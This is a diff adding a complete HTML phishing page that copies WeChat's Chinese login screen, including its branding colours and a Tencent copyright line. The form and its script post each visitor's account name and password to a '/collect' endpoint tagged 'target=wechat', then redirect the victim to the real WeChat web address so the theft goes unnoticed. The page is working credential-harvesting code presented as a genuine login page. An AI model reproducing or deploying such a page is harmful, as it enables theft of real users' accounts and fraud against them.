@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>微信登录</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "PingFang SC", "Microsoft YaHei", sans-serif; background: #f7f7f7; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-container { background: white; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 0; width: 100%; max-width: 360px; overflow: hidden; }
+        .header { background: #07c160; color: white; padding: 24px; text-align: center; }
+        .header h1 { font-size: 22px; font-weight: 500; }
+        .form { padding: 30px 24px; }
+        .form-group { margin-bottom: 16px; }
+        label { display: block; margin-bottom: 6px; font-size: 14px; color: #333; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 15px; }
+        input:focus { outline: none; border-color: #07c160; }
+        .btn { width: 100%; padding: 14px; background: #07c160; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
+        .btn:hover { background: #06ad56; }
+        .footer { padding: 20px 24px; border-top: 1px solid #eee; text-align: center; font-size: 12px; color: #999; }
+        .footer a { color: #07c160; text-decoration: none; margin: 0 8px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header"><h1>微信登录</h1></div>
+        <div class="form">
+            <form id="loginForm" action="/collect" method="POST">
+                <input type="hidden" name="target" value="wechat">
+                <div class="form-group">
+                    <label for="username">手机号/微信号/邮箱</label>
+                    <input type="text" id="username" name="username" required autocomplete="username" placeholder="请输入账号">
+                </div>
+                <div class="form-group">
+                    <label for="password">密码</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="请输入密码">
+                </div>
+                <button type="submit" class="btn">登录</button>
+            </form>
+        </div>
+        <div class="footer">
+            <a href="#">忘记密码</a>
+            <a href="#">注册账号</a>
+            <span>腾讯公司 版权所有</span>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const btn = e.target.querySelector('.btn');
+            btn.textContent = '登录中...';
+            btn.disabled = true;
+            try {
+                const resp = await fetch('/collect', { method: 'POST', body: formData });
+                if (resp.redirected) window.location.href = resp.url;
+                else window.location.href = 'https://wx.qq.com/';
+            } catch { window.location.href = 'https://wx.qq.com/'; }
+        });
+    </script>
+</body>
+</html>
